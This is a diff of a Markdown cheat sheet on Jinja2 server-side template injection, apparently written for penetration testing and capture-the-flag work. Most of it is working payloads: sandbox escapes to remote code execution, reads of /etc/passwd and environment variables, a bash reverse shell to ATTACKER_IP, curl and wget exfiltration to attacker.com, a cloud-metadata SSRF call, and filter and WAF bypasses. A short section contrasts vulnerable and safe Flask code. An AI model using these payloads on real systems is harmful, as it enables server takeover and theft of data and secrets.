@@ -1,480 +1,344 @@
 # SSTI - Jinja2 (Python) Deep Dive
 
-## Overview
+## Quick Reference
 
-Jinja2 is the most popular Python templating engine, used by Flask, Ansible, and many other frameworks. It's sandboxed by default, but can be escaped to achieve RCE.
+| Object | Path to RCE | Notes |
+|--------|------------|-------|
+| `cycler` | `cycler.__init__.__globals__.os.popen('id').read()` | Cleanest, shortest |
+| `lipsum` | `lipsum.__globals__.os.popen('id').read()` | Very reliable |
+| `joiner` | `joiner.__init__.__globals__.os.popen('id').read()` | Alternative |
+| `namespace` | `namespace.__init__.__globals__.os.popen('id').read()` | Alternative |
+| `config` | `config.__class__.__init__.__globals__['os'].popen('id').read()` | Flask only |
+| `request` | `request.application.__globals__.__builtins__.__import__('os').popen('id').read()` | Flask only |
 
----
-
-## Detection
-
-### Basic Test
+**Quick Detection:**
 ```python
-{{7*7}}  # Output: 49
-{{7*'7'}}  # Output: 7777777
-```
-
-### Confirm Jinja2
-```python
-{{config}}  # Shows Flask config
-{{self}}  # Shows template context
-```
-
----
-
-## Understanding Python Object Model
-
-To exploit Jinja2, you need to understand Python's object model:
-
-```python
-# Every object has a class
-''.__class__  # <class 'str'>
-
-# Every class has a base
-''.__class__.__mro__  # Method Resolution Order
-''.__class__.__base__  # Base class (object)
-
-# Base class has subclasses (all classes!)
-''.__class__.__mro__[1].__subclasses__()  # List all classes
-
-# Classes have __init__ with __globals__ (access to builtins)
-some_class.__init__.__globals__
+{{7*7}}      → 49          (SSTI confirmed)
+{{7*'7'}}    → 7777777     (Jinja2 confirmed)
+{{config}}   → Flask config (Flask confirmed)
 ```
 
 ---
 
-## Basic Exploitation
+## What is Jinja2 SSTI?
 
-### Step 1: List All Classes
-```python
-{{ ''.__class__.__mro__[1].__subclasses__() }}
+Jinja2 is the most popular Python templating engine, used by Flask, Ansible, and many other frameworks. It runs in a sandbox by default — but Python's object model makes that sandbox escapable, leading to full RCE.
 
-# Or shorter
-{{ [].__class__.__base__.__subclasses__() }}
-{{ {}.__class__.__base__.__subclasses__() }}
-```
-
-### Step 2: Find Useful Classes
-
-Look for classes with access to dangerous functions:
-```python
-# Warning class (has access to linecache which imports os)
-{{ [].__class__.__base__.__subclasses__()[104] }}
-
-# Catch_warnings
-{{ [].__class__.__base__.__subclasses__()[117] }}
-
-# File class (can read files)
-{{ [].__class__.__base__.__subclasses__()[40] }}
-```
-
-**Note**: Index numbers change between Python versions. Use automation to find them.
-
-### Step 3: Access Dangerous Modules
-
-```python
-# Get os module
-{{ [].__class__.__base__.__subclasses__()[104].__init__.__globals__['sys'].modules['os'].popen('id').read() }}
-
-# Get __builtins__
-{{ [].__class__.__base__.__subclasses__()[104].__init__.__globals__['__builtins__']['__import__']('os').popen('id').read() }}
-```
+**Impact:**
+- 🔓 Full Remote Code Execution via Python object introspection
+- 📂 Read arbitrary files without needing OS access directly
+- 🔑 Dump Flask config, secrets, session keys, and env variables
+- 💀 Reverse shell, SSRF chaining, DB access — all possible post-exploitation
 
 ---
 
-## Common Exploitation Paths
+## Python Object Model (Why This Works)
 
-### Method 1: Using config object (Flask)
+Every Python object exposes its class hierarchy and globals — even inside a sandbox. This is the core of all Jinja2 exploitation.
+
 ```python
-# View config
+''.__class__                        # <class 'str'>
+''.__class__.__mro__                # Method Resolution Order
+''.__class__.__mro__[1]             # <class 'object'> — the root of everything
+''.__class__.__mro__[1].__subclasses__()  # ALL loaded classes in memory
+some_class.__init__.__globals__     # Module-level globals of that class
+```
+
+**The exploit chain:**
+1. Start from any string/list/dict/object
+2. Walk up to `object` via `__mro__`
+3. Get all subclasses loaded in memory
+4. Find one with `os`, `__builtins__`, or `sys` in its `__globals__`
+5. Call `popen()` or `__import__()` → RCE
+
+---
+
+## Exploitation Methods
+
+### Method 1: cycler / lipsum / joiner (Cleanest)
+These are Jinja2 built-in globals — always available, no index hunting needed:
+```python
+{{ cycler.__init__.__globals__.os.popen('id').read() }}
+{{ lipsum.__globals__.os.popen('id').read() }}
+{{ joiner.__init__.__globals__.os.popen('id').read() }}
+{{ namespace.__init__.__globals__.os.popen('id').read() }}
+```
+
+### Method 2: config (Flask-specific)
+```python
 {{ config }}
-
-# Access __builtins__ via config
+{{ config.items() }}
 {{ config.__class__.__init__.__globals__['os'].popen('id').read() }}
 ```
 
-### Method 2: Using self
-```python
-{{ self.__dict__ }}
-{{ self.__class__ }}
-{{ self.__init__.__globals__ }}
-```
-
-### Method 3: Using request (Flask)
+### Method 3: request (Flask-specific)
 ```python
 {{ request }}
 {{ request.__class__ }}
 {{ request.application.__globals__.__builtins__.__import__('os').popen('id').read() }}
 ```
 
-### Method 4: Using lipsum (built-in filter)
+### Method 4: self.__init__.__globals__
 ```python
-{{ lipsum.__globals__ }}
-{{ lipsum.__globals__['os'].popen('id').read() }}
-{{ lipsum.__globals__.__builtins__.__import__('os').popen('id').read() }}
+{{ self.__dict__ }}
+{{ self.__init__.__globals__ }}
+{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}
 ```
 
-### Method 5: Using cycler (built-in)
+### Method 5: Subclass Enumeration (when globals blocked)
 ```python
-{{ cycler.__init__.__globals__.os.popen('id').read() }}
-```
+{{ ''.__class__.__mro__[1].__subclasses__() }}
+{{ [].__class__.__base__.__subclasses__() }}
+{{ {}.__class__.__base__.__subclasses__() }}
 
-### Method 6: Using joiner (built-in)
-```python
-{{ joiner.__init__.__globals__.os.popen('id').read() }}
-```
-
-### Method 7: Using namespace (built-in)
-```python
-{{ namespace.__init__.__globals__.os.popen('id').read() }}
+# Then target index with __globals__
+{{ [].__class__.__base__.__subclasses__()[104].__init__.__globals__['__builtins__']['__import__']('os').popen('id').read() }}
 ```
 
 ---
 
 ## RCE Payloads
 
-### Basic RCE
+**Execute commands:**
 ```python
-{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}
-
 {{ cycler.__init__.__globals__.os.popen('whoami').read() }}
-
-{{ lipsum.__globals__['os'].popen('ls').read() }}
+{{ lipsum.__globals__['os'].popen('ls -la /').read() }}
+{{ self.__init__.__globals__.__builtins__.__import__('os').system('id') }}
 ```
 
-### Read Files
+**Read files:**
 ```python
-# Using file class
-{{ [].__class__.__base__.__subclasses__()[40]('/etc/passwd').read() }}
-
-# Using open()
 {{ cycler.__init__.__globals__.__builtins__.open('/etc/passwd').read() }}
-
-# Using lipsum
 {{ lipsum.__globals__.os.popen('cat /etc/passwd').read() }}
+{{ [].__class__.__base__.__subclasses__()[40]('/etc/passwd').read() }}
 ```
 
-### Execute Commands
+**List directory:**
 ```python
-{{ self.__init__.__globals__.__builtins__.__import__('os').system('whoami') }}
-
-{{ cycler.__init__.__globals__.os.system('ls') }}
+{{ cycler.__init__.__globals__.os.listdir('/') }}
+{{ cycler.__init__.__globals__.os.popen('ls -la /').read() }}
 ```
 
-### Reverse Shell
+**Reverse shell:**
 ```python
 {{ self.__init__.__globals__.__builtins__.__import__('os').popen('bash -c "bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1"').read() }}
+```
+
+**One-liner with GET param (great for CTFs):**
+```python
+{{cycler.__init__.__globals__.os.popen(request.args.cmd).read()}}
+# Trigger: ?cmd=cat /flag.txt
 ```
 
 ---
 
 ## Filter Bypasses
 
-### Bypass Blocked {{}}
+**Bypass `{{` and `}}`:**
 ```python
 {% print(7*7) %}
 {% print config %}
 {%set x=7*7%}{{x}}
 ```
 
-### Bypass Blocked Quotes
+**Bypass quotes:**
 ```python
-# Use request.args to pass data
-{{request.args.x}}  # Access via ?x=value
-
-# Use request.values
-{{request.values.x}}
-
-# Use chr() if available
-{{chr(95)}}  # Underscore
-
-# Concatenation
-{{"__cla"+"ss__"}}
+{{request.args.x}}         # Pass value via ?x=__class__
+{{request.values.x}}       # Same via POST or GET
+{{"__cla"+"ss__"}}         # String concat
 ```
 
-### Bypass Blocked Dots
+**Bypass dots:**
 ```python
-# Use [] notation
 {{''['__class__']}}
-{{''['__class__']['__mro__']}}
-
-# Use attr() filter
 {{''|attr('__class__')}}
 {{''|attr('__class__')|attr('__mro__')}}
-
-# Use getattr if accessible
-{{getattr('',"__class__")}}
+{{getattr(lipsum,'__globals__')}}
 ```
 
-### Bypass Blocked Underscores
+**Bypass underscores:**
 ```python
-# Hex encoding
-{{''['\x5f\x5fclass\x5f\x5f']}}
-
-# Use request.args
-{{request.args.x}}  # Pass ?x=__class__
-
-# Unicode
-{{''['\u005f\u005fclass\u005f\u005f']}}
+{{''['\x5f\x5fclass\x5f\x5f']}}       # Hex encoding
+{{''['\u005f\u005fclass\u005f\u005f']}} # Unicode encoding
+{{request.args.x}}                      # ?x=__class__
 ```
 
-### Bypass Blacklisted Keywords (import, os, eval, etc.)
+**Bypass blacklisted keywords (import, os, eval...):**
 ```python
-# String concatenation
-{{''[("__cla"+"ss__")]}}
 {{lipsum.__globals__[('o'+'s')]}}
-
-# Use request.args
 {{lipsum.__globals__[request.args.x]}}  # ?x=os
-
-# Base64 decode (if available)
-{{lipsum.__globals__[('os'.encode('base64'))|decode('base64')]}}
+{{"__im"+"port__"}}
 ```
 
-### Bypass Attribute Access Restrictions
-```python
-# Use __getitem__
-{{''['__class__']}}
-
-# Use |attr filter
-{{''|attr('__class__')}}
-
-# Use getattr function (if available)
-{{getattr(lipsum,'__globals__')}}
-```
-
----
-
-## Finding Useful Subclasses
-
-### Automated Search Script
-```python
-#!/usr/bin/env python3
-import sys
-
-# Get all subclasses
-for i, cls in enumerate([].__class__.__base__.__subclasses__()):
-    try:
-        if 'warning' in cls.__name__.lower():
-            print(f"[{i}] {cls.__name__}")
-        if hasattr(cls, '__init__'):
-            if hasattr(cls.__init__, '__globals__'):
-                if 'os' in cls.__init__.__globals__:
-                    print(f"[{i}] {cls.__name__} - HAS OS!")
-                if '__builtins__' in cls.__init__.__globals__:
-                    if '__import__' in cls.__init__.__globals__['__builtins__']:
-                        print(f"[{i}] {cls.__name__} - HAS IMPORT!")
-    except:
-        pass
-```
-
-### Common Useful Classes by Index
-
-**Python 2.7**:
-- [40] - file
-- [59] - warnings.catch_warnings
-
-**Python 3.6+**:
-- [104] - warnings.catch_warnings
-- [117] - os._wrap_close
-
-**Note**: These indices vary! Always enumerate.
-
----
-
-## Advanced Techniques
-
-### Blind SSTI (No Output)
-
-#### Time-Based Detection
-```python
-{% import time %}{{time.sleep(5)}}
-```
-
-#### Out-of-Band Exfiltration
-```python
-{{ lipsum.__globals__.os.popen('curl http://attacker.com/?data=$(cat /flag.txt)').read() }}
-
-{{ lipsum.__globals__.os.popen('wget --post-data="$(cat /flag.txt)" http://attacker.com').read() }}
-```
-
-### Reading Files Without RCE
-```python
-# Using file object
-{{ [].__class__.__base__.__subclasses__()[40]('/etc/passwd').read() }}
-
-# Using url_for (Flask specific)
-{{ url_for.__globals__.os.popen('cat /etc/passwd').read() }}
-```
-
-### Breaking Out of {% raw %} Blocks
-```python
-{% raw %}
-{{7*7}}  # This won't execute
-{% endraw %}
-{{7*7}}  # This will execute
-```
-
-### Chaining with Other Vulnerabilities
-
-#### SSTI + SSRF
-```python
-{{ lipsum.__globals__.os.popen('curl http://169.254.169.254/latest/meta-data/').read() }}
-```
-
-#### SSTI + SQLi
-```python
-{{ lipsum.__globals__.os.popen("mysql -u root -e 'SELECT * FROM users'").read() }}
-```
-
----
-
-## CTF-Specific Payloads
-
-### Read flag.txt
-```python
-{{ cycler.__init__.__globals__.os.popen('cat /flag.txt').read() }}
-
-{{ lipsum.__globals__.__builtins__.open('/flag.txt').read() }}
-
-{{ [].__class__.__base__.__subclasses__()[40]('/flag.txt').read() }}
-```
-
-### List Files
-```python
-{{ cycler.__init__.__globals__.os.popen('ls -la /').read() }}
-
-{{ cycler.__init__.__globals__.os.listdir('/') }}
-```
-
-### Environment Variables
-```python
-{{ cycler.__init__.__globals__.os.environ }}
-
-{{ lipsum.__globals__.os.environ['FLAG'] }}
-```
-
-### One-Liner RCE
-```python
-{{cycler.__init__.__globals__.os.popen(request.args.cmd).read()}}
-# Use: ?cmd=cat /flag.txt
-```
-
----
-
-## WAF Bypass Techniques
-
-### Space Bypass
-```python
-# Use + or %20 in URL encoding
-{{7*7}}  # Normal
-{{7*7}}  # With encoded spaces (already no spaces)
-
-# Use comments
-{{7/**/7}}
-```
-
-### Parentheses Bypass
-```python
-# Use getattr
-{{getattr(lipsum,'__globals__')}}
-
-# Use [] 
-{{lipsum['__globals__']}}
-```
-
-### Filter Chain to Confuse WAF
+**WAF filter chain (confuse pattern matching):**
 ```python
 {{''|attr('__class__')|attr('__mro__')|attr('__getitem__')(1)|attr('__subclasses__')()|attr('__getitem__')(104)}}
 ```
 
 ---
 
-## Payload Templates
+## Finding Useful Subclasses
 
-### Generic RCE Template
+Index numbers for `__subclasses__()` vary by Python version — always enumerate.
+
+**Common useful indices:**
+
+| Python Version | Index | Class |
+|---------------|-------|-------|
+| Python 2.7 | [40] | `file` |
+| Python 2.7 | [59] | `warnings.catch_warnings` |
+| Python 3.6+ | [104] | `warnings.catch_warnings` |
+| Python 3.6+ | [117] | `os._wrap_close` |
+
+**Search script to run locally:**
 ```python
-{{<OBJECT>.__init__.__globals__.__builtins__.__import__('os').popen('<COMMAND>').read()}}
-```
-
-Replace `<OBJECT>` with: `cycler`, `lipsum`, `joiner`, `namespace`, `self`, `config`, `request`
-
-### Generic File Read Template
-```python
-{{<OBJECT>.__init__.__globals__.__builtins__.open('<FILE>').read()}}
-```
-
-### Generic Class Enumeration
-```python
-{{''.__class__.__mro__[1].__subclasses__()[<INDEX>]}}
+for i, cls in enumerate([].__class__.__base__.__subclasses__()):
+    try:
+        if hasattr(cls.__init__, '__globals__'):
+            g = cls.__init__.__globals__
+            if 'os' in g:
+                print(f"[{i}] {cls.__name__} — HAS os!")
+            if '__builtins__' in g and '__import__' in g['__builtins__']:
+                print(f"[{i}] {cls.__name__} — HAS __import__!")
+    except:
+        pass
 ```
 
 ---
 
-## Detection to Exploitation Workflow
+## Blind SSTI & Advanced Chains
 
+**Time-based detection (no output):**
+```python
+{% import time %}{{time.sleep(5)}}
 ```
-1. Detect SSTI: {{7*7}} → 49
-2. Confirm Jinja2: {{7*'7'}} → 7777777
-3. Access config: {{config}} (Flask)
-4. Find exploitable objects: {{lipsum}}, {{cycler}}
-5. Get __globals__: {{lipsum.__globals__}}
-6. Check for os: {{lipsum.__globals__.os}}
-7. RCE: {{lipsum.__globals__.os.popen('id').read()}}
-8. Read flag: {{lipsum.__globals__.os.popen('cat /flag.txt').read()}}
+
+**Out-of-band exfiltration:**
+```python
+{{ lipsum.__globals__.os.popen('curl http://attacker.com/?d=$(cat /flag.txt)').read() }}
+{{ lipsum.__globals__.os.popen('wget --post-data="$(cat /flag.txt)" http://attacker.com').read() }}
+```
+
+**SSTI + SSRF (cloud metadata):**
+```python
+{{ lipsum.__globals__.os.popen('curl http://169.254.169.254/latest/meta-data/').read() }}
+```
+
+**SSTI + DB access:**
+```python
+{{ lipsum.__globals__.os.popen("mysql -u root -e 'SELECT * FROM users'").read() }}
+```
+
+**url_for (alternative Flask vector):**
+```python
+{{ url_for.__globals__.os.popen('cat /etc/passwd').read() }}
 ```
 
 ---
 
-## Quick Reference
+## Exploitation Workflow
 
-### Detection
+**Step 1:** Inject `{{7*7}}` — if output is `49`, SSTI is confirmed.
+
+**Step 2:** Inject `{{7*'7'}}` — if output is `7777777`, engine is Jinja2.
+
+**Step 3:** Try `{{config}}` to confirm Flask and see exposed secrets.
+
+**Step 4:** Try the cleanest built-in vectors: `cycler`, `lipsum`, `joiner`.
+
+**Step 5:** Access `__globals__` and verify `os` is reachable: `{{lipsum.__globals__.os}}`.
+
+**Step 6:** Execute `id`/`whoami` to confirm RCE: `{{cycler.__init__.__globals__.os.popen('id').read()}}`.
+
+**Step 7:** Read the flag: `{{cycler.__init__.__globals__.os.popen('cat /flag.txt').read()}}`.
+
+**Step 8:** If blocked — apply filter bypasses (hex, attr(), request.args, string concat).
+
+---
+
+## Common Vulnerable Patterns
+
+**Pattern 1 — Flask f-string in render_template_string:**
 ```python
-{{7*7}}
-{{7*'7'}}
-{{config}}
+# ❌ Vulnerable
+@app.route('/greet')
+def greet():
+    name = request.args.get('name')
+    return render_template_string(f"Hello {name}")
+
+# ✅ Safe
+return render_template_string("Hello {{ name }}", name=name)
 ```
 
-### Basic RCE
+**Pattern 2 — Dynamic template construction:**
 ```python
-{{cycler.__init__.__globals__.os.popen('id').read()}}
-{{lipsum.__globals__.os.popen('whoami').read()}}
+# ❌ Vulnerable
+template = "Dear " + user_input + ", your order is ready."
+rendered = env.from_string(template).render()
+
+# ✅ Safe
+rendered = env.from_string("Dear {{ name }}, your order is ready.").render(name=user_input)
 ```
 
-### Read Flag
+**Pattern 3 — Error messages echoing input:**
 ```python
-{{cycler.__init__.__globals__.os.popen('cat /flag.txt').read()}}
+# ❌ Vulnerable
+return render_template_string(f"Error: {request.args.get('msg')}")
 ```
 
-### Bypass Dots
+**Pattern 4 — Email/notification templates with raw input:**
 ```python
-{{''|attr('__class__')}}
-```
-
-### Bypass Underscores
-```python
-{{''['\x5f\x5fclass\x5f\x5f']}}
-```
-
-### List All Classes
-```python
-{{''.__class__.__mro__[1].__subclasses__()}}
+# ❌ Vulnerable
+subject_template = f"Hello {username}, your invoice is ready"
+render(subject_template)
 ```
 
 ---
 
-## Useful Built-in Objects (Jinja2/Flask)
+## CTF / Practical Tips
 
-- `config` - Flask configuration
-- `request` - Current HTTP request
-- `session` - User session
-- `g` - Application context
-- `lipsum` - Lorem ipsum generator
-- `cycler` - Template cycler utility
-- `joiner` - String joiner
-- `namespace` - Namespace object
-- `dict` - Dictionary class
-- `url_for` - URL building function
-- `get_flashed_messages` - Flask messages
+**Read flag:**
+```python
+{{ cycler.__init__.__globals__.os.popen('cat /flag.txt').read() }}
+{{ lipsum.__globals__.__builtins__.open('/flag.txt').read() }}
+{{ [].__class__.__base__.__subclasses__()[40]('/flag.txt').read() }}
+```
 
-All of these can potentially be used to reach `__globals__` and escape the sandbox!
+**Check environment variables:**
+```python
+{{ cycler.__init__.__globals__.os.environ }}
+{{ lipsum.__globals__.os.environ['FLAG'] }}
+```
+
+**Dynamic command via GET param:**
+```python
+{{cycler.__init__.__globals__.os.popen(request.args.cmd).read()}}
+# ?cmd=cat /flag.txt
+# ?cmd=ls -la /
+# ?cmd=env
+```
+
+**Common CTF scenarios:**
+- ⚠️ Flag in `/flag.txt`, `/flag`, `/root/flag.txt`, or as env var `FLAG`
+- ⚠️ WAF blocks `_` — use `\x5f` hex encoding or `request.args`
+- ⚠️ WAF blocks `.` — use `|attr()` filter or `[]` notation
+- ⚠️ WAF blocks `{{` — use `{%print(...)%}` or `{%set x=...%}{{x}}`
+- ⚠️ No output — use OOB exfil via `curl` or `wget` with flag as GET param
+- ⚠️ Subclass indices wrong — run the search script locally against same Python version
+
+**Jinja2 built-in objects always available:**
+`config`, `request`, `session`, `g`, `lipsum`, `cycler`, `joiner`, `namespace`, `dict`, `url_for`, `get_flashed_messages`
+
+---
+
+## Key Takeaways
+
+✅ Jinja2's sandbox is escapable via Python's object model — `__mro__`, `__subclasses__()`, and `__globals__` are the core chain.
+
+✅ `cycler` and `lipsum` are the shortest, cleanest RCE paths — no index hunting needed.
+
+✅ When one object is blocked, there are 10+ alternatives: `joiner`, `namespace`, `config`, `request`, `url_for`, `self`...
+
+✅ Most WAF bypasses rely on `request.args` (out-of-band input), `|attr()` (no dots), and hex/unicode encoding (no underscores).
+
+✅ Always check env variables — CTF flags are frequently stored in `os.environ` rather than files.
